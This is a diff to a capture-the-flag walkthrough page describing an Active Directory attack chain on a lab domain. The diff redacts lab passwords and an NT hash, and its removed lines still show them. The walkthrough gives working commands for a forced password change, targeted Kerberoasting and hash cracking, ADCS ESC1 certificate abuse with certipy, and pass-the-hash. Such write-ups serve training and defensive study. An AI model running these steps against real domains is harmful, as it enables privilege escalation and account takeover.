@@ -10,7 +10,7 @@
   <meta property="og:title" content="Arasaka CTF Walkthrough - HackSmarter Labs | Z3rotrace" />
   <meta property="og:description" content="Active Directory exploitation walkthrough covering Forced Password Change, Targeted Kerberoasting, and ADCS ESC1 vulnerability for domain privilege escalation." />
   <meta property="og:image" content="https://z3rotrace.live/assets/arasaka/bloodhound-forcechangepassword.png" />
-  <meta property="og:url" content="https://z3rotrace.live/walkthroughs/arasaka.html" />
+  <meta property="og:url" content="https://z3rotrace.live/HackSmarter/arasaka.html" />
   <meta property="og:type" content="article" />
 
   <!-- Twitter Card tags -->
@@ -197,16 +197,16 @@
         </ul>
       </li>
       <li class="has-submenu">
-        <button class="submenu-toggle" aria-expanded="true"><span class="arrow" aria-hidden="true"></span>Machines Walkthroughs</button>
+        <button class="submenu-toggle" aria-expanded="true"><span class="arrow" aria-hidden="true"></span>HackSmarter Labs</button>
         <ul class="submenu">
-          <li><a href="welcome.html">Welcome - ADCS ESC1</a></li>
-          <li><a href="staged.html">Staged - HackSmarter Labs</a></li>
-          <li><a href="buildingmagic.html">BuildingMagic - HackSmarter Labs</a></li>
-          <li><a href="arasaka.html" aria-current="page">Arasaka - HackSmarter Labs</a></li>
-          <li><a href="midgarden2-badsuccessor.html">Midgarden2 - BadSuccessor</a></li>
-          <li><a href="banksmarter.html">BankSmarter - HackSmarter Labs</a></li>
-          <li><a href="ascension.html">Ascension - HackSmarter Labs</a></li>
-          <li><a href="slayer.html">Slayer - HackSmarter Labs</a></li>
+          <li><a href="welcome.html">Welcome</a></li>
+          <li><a href="staged.html">Staged</a></li>
+          <li><a href="buildingmagic.html">BuildingMagic</a></li>
+          <li><a href="arasaka.html" aria-current="page">Arasaka</a></li>
+          <li><a href="midgarden2-badsuccessor.html">Midgarden2</a></li>
+          <li><a href="banksmarter.html">BankSmarter</a></li>
+          <li><a href="ascension.html">Ascension</a></li>
+          <li><a href="slayer.html">Slayer</a></li>
           <li><a href="anomaly.html">Anomaly</a></li>
           <li><a href="sharethepain.html">ShareThePain</a></li>
           <li><a href="sysco.html">Sysco</a></li>
@@ -258,17 +258,17 @@
       </tr>
       <tr>
         <td><code>yorinobu</code></td>
-        <td><code>hacksmarter123</code></td>
+        <td><code>[REDACTED]</code></td>
         <td>Forced Password Change</td>
       </tr>
       <tr>
         <td><code>soulkiller.svc</code></td>
-        <td><code>MYpassword123#</code></td>
+        <td><code>[REDACTED]</code></td>
         <td>Kerberoasting</td>
       </tr>
       <tr>
         <td><code>the_emperor</code></td>
-        <td><code>d87640b0d83dc7f90f5f30bd6789b133</code> (NT hash)</td>
+        <td><code>[REDACTED]</code> (NT hash)</td>
         <td>ADCS ESC1</td>
       </tr>
     </tbody>
@@ -293,11 +293,11 @@
 Enter new password for YORINOBU:
 Password for [HACKSMARTER.LOCAL\alt.svc]:</code></pre>
 
-  <p>I set the new password to <code>hacksmarter123</code> and verified the credentials worked:</p>
-  <pre><code>$ nxc smb hacksmarter.local -u yorinobu -p 'hacksmarter123'</code></pre>
+  <p>I set the new password to <code>[REDACTED]</code> and verified the credentials worked:</p>
+  <pre><code>$ nxc smb hacksmarter.local -u yorinobu -p '[REDACTED]'</code></pre>
 
   <pre><code>SMB         10.1.61.68      445    DC01             [*] Windows Server 2022 Build 20348 x64 (name:DC01) (domain:hacksmarter.local) (signing:True) (SMBv1:False)
-SMB         10.1.61.68      445    DC01             [+] hacksmarter.local\yorinobu:hacksmarter123</code></pre>
+SMB         10.1.61.68      445    DC01             [+] hacksmarter.local\yorinobu:[REDACTED]</code></pre>
 
   <p>The <code>[+]</code> confirms successful authentication.</p>
 
@@ -311,19 +311,19 @@ SMB         10.1.61.68      445    DC01             [+] hacksmarter.local\yorino
     <p>Unlike standard Kerberoasting which requests TGS tickets for all SPNs in the domain, targeted Kerberoasting focuses on specific accounts. This is useful when you have write permissions to set an SPN on a target account, or when you want to avoid detection by limiting your requests.</p>
   </div>
 
-  <pre><code>$ targetedKerberoast.py -v -d 'hacksmarter.local' -u 'yorinobu' -p 'hacksmarter123'</code></pre>
+  <pre><code>$ targetedKerberoast.py -v -d 'hacksmarter.local' -u 'yorinobu' -p '[REDACTED]'</code></pre>
 
   <p>The tool retrieved a Kerberos TGS ticket for the <code>soulkiller.svc</code> account. I cracked the hash using hashcat:</p>
   <pre><code>$ hashcat -m 13100 soulkiller.hash /usr/share/wordlists/rockyou.txt</code></pre>
 
   <div class="key-finding">
-    <strong>Cracked password:</strong> <code>MYpassword123#</code>
+    <strong>Cracked password:</strong> <code>[REDACTED]</code>
   </div>
 
   <h3><span class="step">[Step 3]</span> Enumerating ADCS Vulnerabilities</h3>
   <p>With the <code>soulkiller.svc</code> credentials, I used Certipy to enumerate Active Directory Certificate Services for vulnerable certificate templates:</p>
 
-  <pre><code>$ certipy find -u soulkiller.svc@hacksmarter.local -p 'MYpassword123#' -dc-ip 10.1.61.68 -vulnerable</code></pre>
+  <pre><code>$ certipy find -u soulkiller.svc@hacksmarter.local -p '[REDACTED]' -dc-ip 10.1.61.68 -vulnerable</code></pre>
 
   <pre><code>Certipy v5.0.4 - by Oliver Lyak (ly4k)
 
@@ -359,7 +359,7 @@ SMB         10.1.61.68      445    DC01             [+] hacksmarter.local\yorino
   <h3><span class="step">[Step 4]</span> Exploiting ESC1 for Privilege Escalation</h3>
   <p>The vulnerable template <code>AI_Takeover</code> allows <code>soulkiller.svc</code> to request certificates with arbitrary UPNs. I requested a certificate for <code>the_emperor</code>, a high-privileged account:</p>
 
-  <pre><code>$ certipy req -u 'soulkiller.svc@hacksmarter.local' -p 'MYpassword123#' -dc-ip 10.1.61.68 \
+  <pre><code>$ certipy req -u 'soulkiller.svc@hacksmarter.local' -p '[REDACTED]' -dc-ip 10.1.61.68 \
     -ca hacksmarter-DC01-CA -target 'DC01.hacksmarter.local' \
     -template 'AI_Takeover' -upn 'the_emperor@hacksmarter.local'</code></pre>
 
@@ -388,7 +388,7 @@ SMB         10.1.61.68      445    DC01             [+] hacksmarter.local\yorino
 [*] Saving credential cache to 'the_emperor.ccache'
 [*] Wrote credential cache to 'the_emperor.ccache'
 [*] Trying to retrieve NT hash for 'the_emperor'
-[*] Got hash for 'the_emperor@hacksmarter.local': aad3b435b51404eeaad3b435b51404ee:d87640b0d83dc7f90f5f30bd6789b133</code></pre>
+[*] Got hash for 'the_emperor@hacksmarter.local': [REDACTED]:[REDACTED]</code></pre>
 
   <div class="question">
     <strong>What is an NT Hash?</strong>
@@ -400,11 +400,11 @@ SMB         10.1.61.68      445    DC01             [+] hacksmarter.local\yorino
   <h2>Proof</h2>
 
   <div class="key-finding">
-    <strong>the_emperor NT Hash:</strong> <code>d87640b0d83dc7f90f5f30bd6789b133</code>
+    <strong>the_emperor NT Hash:</strong> <code>[REDACTED]</code>
   </div>
 
   <p>The NT hash can be used for pass-the-hash attacks to authenticate as <code>the_emperor</code> without knowing the plaintext password:</p>
-  <pre><code>$ nxc smb 10.1.61.68 -u 'the_emperor' -H 'd87640b0d83dc7f90f5f30bd6789b133'</code></pre>
+  <pre><code>$ nxc smb 10.1.61.68 -u 'the_emperor' -H '[REDACTED]'</code></pre>
 
   <h2>Attack Chain Summary</h2>
 
@@ -413,11 +413,11 @@ SMB         10.1.61.68      445    DC01             [+] hacksmarter.local\yorino
     |
     | ForceChangePassword
     v
-yorinobu (password reset to hacksmarter123)
+yorinobu (password reset to [REDACTED])
     |
     | Targeted Kerberoasting
     v
-soulkiller.svc (cracked: MYpassword123#)
+soulkiller.svc (cracked: [REDACTED])
     |
     | ESC1 - Certificate with arbitrary SAN
     v
